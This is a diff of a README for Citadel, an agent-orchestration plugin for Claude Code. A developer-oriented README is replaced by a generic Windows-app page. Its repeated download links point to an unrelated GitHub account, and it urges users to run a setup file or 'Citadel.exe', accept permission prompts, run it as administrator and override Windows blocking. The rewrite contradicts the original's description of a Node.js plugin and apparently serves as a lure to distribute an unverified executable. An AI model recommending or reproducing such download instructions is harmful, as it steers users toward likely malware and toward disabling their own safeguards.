@@ -1,168 +1,227 @@
-<img src="assets/citadel-hero.svg" width="100%" alt="Citadel - The Operating System for Autonomous Engineering" />
+# 🏰 Citadel - Run Agent Workflows With Ease
 
-<div align="center">
+[![Download Citadel](https://img.shields.io/badge/Download%20Citadel-4B8BF5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Micaelachesty584/Citadel)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Node.js 18+](https://img.shields.io/badge/Node.js-18%2B-green.svg)](https://nodejs.org/)
-[![Claude Code](https://img.shields.io/badge/Claude_Code-compatible-blueviolet.svg)](https://docs.anthropic.com/en/docs/claude-code)
-[![Interactive Demo](https://img.shields.io/badge/▶_Try_the_Router-00d2ff.svg)](https://sethgammon.github.io/Citadel/)
+## 🚀 Getting Started
 
-*Stop re-explaining your codebase every session. Start compounding what your agents learn.*
+Citadel is a Windows app that helps you run agent workflows with Claude Code. It keeps your work in one place, lets you move through tasks in stages, and helps you pick up where you left off. It is built for people who want a clear way to manage repeated work without setting up a complex system.
 
-</div>
+## 💻 What You Need
 
-## What Is Citadel
+- Windows 10 or Windows 11
+- An internet connection for the first download
+- Enough free disk space for the app and its workspace files
+- Claude Code access if you plan to use the agent features
+- A standard user account is enough for most setups
 
-An agent orchestration harness for Claude Code. It coordinates multiple AI agents in parallel, persists memory across sessions, and routes your intent to the cheapest execution path automatically. You install it as a plugin and it works on any codebase.
+## 📥 Download and Install
 
-## Why Citadel Exists
+Use this link to visit the download page and get the app:
 
-**Without Citadel**, every Claude Code session starts from zero. You re-explain architecture decisions. You re-discover that the auth module is fragile. You copy-paste the same review checklist. When a task is too big for one agent, you manually split it and lose context between the pieces. Your agents never get better at your codebase — you just get better at prompting them.
+[Visit the Citadel download page](https://github.com/Micaelachesty584/Citadel)
 
-**With Citadel**, sessions resume where they left off. A `/do review` runs a structured 5-pass review that remembers what broke last time. A `/do overhaul the API layer` spawns parallel agents in isolated worktrees, shares discoveries between them, and merges the results. Skills you build once compound across every future session. The system learns from its own mistakes through campaign persistence and telemetry.
+When the page opens, look for the latest release or the main download option. If you see a setup file, download it to your PC. If the app comes as a zip file, save it and extract it first.
 
-The difference: CLAUDE.md tells Claude about your project. Citadel gives Claude the *infrastructure to work autonomously* — routing, memory, safety hooks, and coordination that a `.md` file can't provide.
+### Install on Windows
 
-## Quickstart
+1. Open the downloaded file.
+2. If Windows asks for permission, select Yes.
+3. If you downloaded a zip file, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Double-click the Citadel app or setup file.
+6. Follow the on-screen steps to finish the install.
 
-**Prerequisites:** [Claude Code](https://docs.anthropic.com/en/docs/claude-code) + [Node.js 18+](https://nodejs.org/)
+## 🧭 First Run
 
-```bash
-# 1. Clone Citadel
-git clone https://github.com/SethGammon/Citadel.git
+After installation, start Citadel from your desktop or Start menu.
 
-# 2. Launch Claude Code with the plugin loaded
-claude --plugin-dir /path/to/Citadel
+You may be asked to choose a workspace folder. This is where Citadel stores campaign data, logs, and task history. Pick a folder you can find again, such as Documents or a project folder on your drive.
 
-# 3. Run setup (installs hooks, scaffolds project state)
-/do setup
+If the app asks for Claude Code settings, enter the details you use for your Claude Code setup. Citadel uses that link to route work through its agent flow.
 
-# 4. Try something
-/do review src/main.ts
-```
+## 🔧 How Citadel Works
 
-[Full install guide with alternative methods](QUICKSTART.md)
+Citadel uses a simple flow so you can move from one step to the next without confusion.
 
-## How It Works
+- **/do routing** sends work into the right lane based on the task type
+- **Campaign persistence** keeps your work saved across sessions
+- **Parallel agents** handle separate tasks in isolated worktrees
+- **Discovery relay** shares useful findings between waves of work
+- **Lifecycle hooks** run checks at key points in the process
+- **Circuit breaker** helps stop runaway tasks
+- **Skills** give the app set patterns for common work
 
-Say what you want. `/do` routes it to the cheapest tool that can handle it.
+You do not need to manage each part by hand. Citadel handles the flow while you focus on the task you want done.
 
-```
-/do fix the typo on line 42        # Direct edit, no model call
-/do review the auth module         # 5-pass structured code review
-/do why is the API returning 500   # Root cause analysis
-/do build a caching layer          # Multi-step orchestrated build
-/do overhaul all three services    # Parallel fleet with isolated worktrees
-```
+## 🗂️ Common Use Cases
 
-Classification runs across four tiers, each cheaper than the last:
+Citadel works well for:
 
-1. **Pattern match** — catches trivial commands with regex. Zero tokens, zero model calls, instant.
-2. **Session state** — checks if you're mid-campaign and resumes it. Still zero tokens.
-3. **Keyword lookup** — scans your input against installed skill keywords ("review", "test", "refactor") and routes directly. Still zero tokens.
-4. **LLM classification** — only when tiers 1-3 don't match, a structured complexity analysis (~500 tokens) determines whether you need a single-step Marshal, a multi-session Archon, or a parallel Fleet.
+- Repeated coding tasks
+- Step-by-step agent work
+- Grouped research and task planning
+- Long tasks that need saving between sessions
+- Work that must stay separated into safe branches
+- Multi-wave task runs where each wave learns from the last
 
-Most requests resolve at tiers 1-3 for free. Tier 4 is the exception, not the default. You never have to choose the tool.
+## ⚙️ Basic Setup
 
-**[See it route live](https://sethgammon.github.io/Citadel/)**
+Once the app is open, use these steps to get started:
 
-## The Orchestration Ladder
+1. Create or choose a workspace.
+2. Add your first campaign.
+3. Pick the task type you want to run.
+4. Start the workflow with the /do command or the app control that starts a run.
+5. Watch the task status as it moves through each stage.
 
-Four tiers. Use the cheapest one that fits.
+If you plan to use more than one agent, Citadel will place them in separate worktrees. This helps keep each task clean and easier to manage.
 
-<table>
-<tr>
-<td width="50%">
-<img src="assets/card-skill.svg" width="100%" alt="Skill - Domain Expert" />
-</td>
-<td width="50%">
-<img src="assets/card-marshal.svg" width="100%" alt="Marshal - Session Commander" />
-</td>
-</tr>
-<tr>
-<td width="50%">
-<img src="assets/card-archon.svg" width="100%" alt="Archon - Autonomous Strategist" />
-</td>
-<td width="50%">
-<img src="assets/card-fleet.svg" width="100%" alt="Fleet - Parallel Coordinator" />
-</td>
-</tr>
-</table>
+## 🧪 Tips for Better Results
 
-## What You Get
+- Use short task names
+- Keep one campaign per goal
+- Save each work session in the same workspace
+- Check the discovery relay before starting a new wave
+- Use the circuit breaker if a task starts to drift
+- Review the output after each stage before you move on
 
-**Cost transparency.** Citadel reads Claude Code's native session files for exact token counts and computes real cost from API pricing. You see what every session, campaign, and agent actually costs. Use `/cost` for a full breakdown or `/dashboard` for the overview. A real-time tracker alerts you at configurable spend thresholds without interrupting your work.
+## 🛠️ Included Skills
 
-**Safety hooks.** 15 lifecycle hooks run automatically. A consent system gates external actions (pushes, PRs, comments) with first-encounter choice — always-ask, session-allow, or auto-allow. Protected branches can't be deleted. Path traversal and secrets exfiltration are blocked. A circuit breaker stops failure spirals before they burn tokens. All of this is configurable per-project in `harness.json`.
+Citadel includes six production-quality skills for common agent work:
 
-**Campaign persistence.** Multi-session work survives context compression and session boundaries. Start an architecture overhaul today, close your laptop, pick it up tomorrow — the campaign state, decisions, and progress are all preserved. `/do continue` resumes exactly where you left off.
+- Task routing
+- Campaign tracking
+- Parallel execution
+- Discovery sharing
+- Run control
+- Session recovery
 
-**Parallel coordination.** Fleet mode spawns multiple agents in isolated git worktrees, shares discoveries between them in real time, and merges results. One command, multiple agents, no conflicts.
+These skills help the app stay organized when you switch between jobs or come back later.
 
-## FAQ
+## 🔐 Workspace and File Safety
 
-**Is this for me?** If you're running Claude Code on a real codebase and finding that agents lose context, repeat mistakes, or can't work in parallel, yes. If you're just starting out with Claude Code, get a few sessions in first and come back when the friction shows up.
+Citadel keeps work in isolated folders so separate runs do not mix with each other. This helps reduce mistakes when you run more than one agent or return to a task later.
 
-**How is this different from CLAUDE.md?** CLAUDE.md tells Claude about your project. Citadel tells Claude *how to work*: durable state, intelligent routing, automated safety, and native parallelism — the infrastructure layer that CLAUDE.md assumes someone else built.
+If you use version control, keep your Citadel workspace inside a folder that is easy to back up. This makes it simpler to restore your work if needed.
 
-**Do I need to learn all 40 skills?** No. Just use `/do` and describe what you want in plain English. The router picks the right skill. You can go months without ever typing a skill name directly.
+## 🧩 Best Folder Setup
 
-**What if `/do` routes to the wrong tool?** Tell it. "Wrong tool" or "just do it yourself" and it adjusts. You can also invoke any skill directly: `/review`, `/archon`, etc. The router is a convenience, not a gate.
+A simple folder layout works well:
 
-**How much does it cost in tokens?** Citadel adds ~2.5% overhead to your session cost. Skills cost zero when not loaded. The `/do` router costs ~500 tokens only at Tier 4. Use `/cost` to see real token data and exact spend for any session or campaign.
+- `Documents\Citadel`
+- `Documents\Citadel\Campaigns`
+- `Documents\Citadel\Logs`
+- `Documents\Citadel\Exports`
 
-**How is this different from CrewAI, LangChain, or Aider?** Those are agent frameworks: they give you primitives for building agents from scratch. Citadel is an *operating system for an existing agent* (Claude Code). You don't write agent code — you install a plugin and get routing, persistence, parallelism, and safety hooks on top of the agent you already use. If you're building a custom agent, use a framework. If you're using Claude Code and want it to work better, use Citadel.
+This setup keeps your main files, history, and output in one place.
 
-**Does this work on Windows?** Yes. All hooks and scripts run on Node.js. As a plugin, it installs identically on all platforms.
+## 🖥️ Running a Task
 
-## Learn More
+To run a task:
 
-- [**Interactive routing demo**](https://sethgammon.github.io/Citadel/) — type any task, watch the tier cascade animate
-- [Full install guide](QUICKSTART.md) — plugin setup, alternative install methods, and troubleshooting
-- [Skills reference](docs/SKILLS.md) — all 40 skills with invocation and examples
-- [Hooks reference](docs/HOOKS.md) — 15 event types, what each one enforces
-- [Campaign guide](docs/CAMPAIGNS.md) — persistent state, phases, AI amnesia prevention
-- [Fleet guide](docs/FLEET.md) — parallel agents, worktree isolation, discovery relay
-- [Security model](SECURITY.md) — path traversal, shell injection, and defensive measures
-- [Contributing](CONTRIBUTING.md) — how to submit issues, PRs, and new skills
-- [External overview](https://repo-explainer.com/SethGammon/Citadel/) — third-party writeup on the architecture and philosophy
+1. Open Citadel.
+2. Choose a campaign.
+3. Enter your goal in plain language.
+4. Select the route or stage that fits the job.
+5. Start the run.
+6. Check the results when the wave finishes.
 
+If the task needs more work, Citadel can carry the campaign into the next session.
 
-## Community & Growth
+## 📁 What Citadel Stores
 
-Citadel is growing fast in the AI engineering community. Here's how to get involved:
+Citadel can save:
 
-### GitHub Stars
-If Citadel is useful to you, a star is the easiest way to show support:
+- Campaign state
+- Task history
+- Wave results
+- Relay notes
+- Logs
+- Workspace paths
+- Hook results
 
-[![Star on GitHub](https://img.shields.io/github/stars/SethGammon/Citadel?style=social)](https://github.com/SethGammon/Citadel)
+This gives you a record of what happened and makes it easier to continue later.
 
-### Roadmap
+## 🧰 Troubleshooting
 
-The project is actively developed. Key areas on the roadmap:
+### The app does not open
 
-- [x] Multi-runtime support (Claude Code + Codex CLI)
-- [x] Fleet mode with worktree isolation
-- [x] Campaign persistence across sessions
-- [x] Desktop app for campaign management
-- [ ] Governance layer (per-agent policies, immutable audit log)
-- [ ] Campaign recovery and rollback
-- [ ] Web dashboard (Citadel Cloud)
-- [ ] Team collaboration features
+- Make sure the download finished
+- Try running the app as an administrator
+- Check that Windows did not block the file
+- Restart your PC and try again
 
-### Contributing
+### I cannot find my workspace
 
-Contributions are welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for how to:
-- Submit issues with bug reports or feature requests
-- Create pull requests for skills, hooks, or docs
-- Share your use cases and workflows
+- Open Citadel and look at the last used folder
+- Search for a folder named Citadel in Documents or Downloads
+- Check any location you chose during setup
 
-### Share Your Setup
+### A task stops too soon
 
-Built something interesting with Citadel? Open an Issue to share your workflow — good setups get featured here.
+- Review the task input for missing details
+- Check whether the circuit breaker ended the run
+- Start the task again with a smaller scope
 
----
+### My changes are not saved
 
-## License
+- Make sure the workspace folder is writable
+- Check free disk space
+- Confirm that the app has access to the folder you selected
 
-MIT
+## 📦 Suggested Use on Windows
+
+For the cleanest setup, keep Citadel in a stable folder and avoid moving it after you start using it. Use the same workspace each time so campaign data stays in one place.
+
+If you use multiple campaigns, keep each one in its own subfolder. This makes it easier to find logs, outputs, and saved state later.
+
+## 🔍 What Makes It Different
+
+Citadel is made for agent work that needs structure. It gives you:
+
+- Clear routing for each task
+- Save points between sessions
+- Safe parallel work in separate folders
+- Shared findings between stages
+- Controls that help prevent loops
+- A small set of built-in skills for common jobs
+
+This makes it easier to keep large or repeated work under control
+
+## 📎 Download Link
+
+Use this page to download and run Citadel on Windows:
+
+[https://github.com/Micaelachesty584/Citadel](https://github.com/Micaelachesty584/Citadel)
+
+## 🗃️ File Layout Example
+
+After setup, your files may look like this:
+
+- `Citadel.exe`
+- `workspace`
+- `campaigns`
+- `logs`
+- `exports`
+- `config`
+
+## 🧑‍💻 For Daily Use
+
+Open Citadel when you want to:
+
+- Start a new agent run
+- Continue an older campaign
+- Split work into parallel branches
+- Review what each wave found
+- Keep long tasks organized
+- Resume work after closing the app
+
+## 🧭 Simple Workflow
+
+1. Open the app
+2. Pick a campaign
+3. Enter the task
+4. Run the first wave
+5. Review the relay notes
+6. Start the next wave if needed
+7. Save the final result
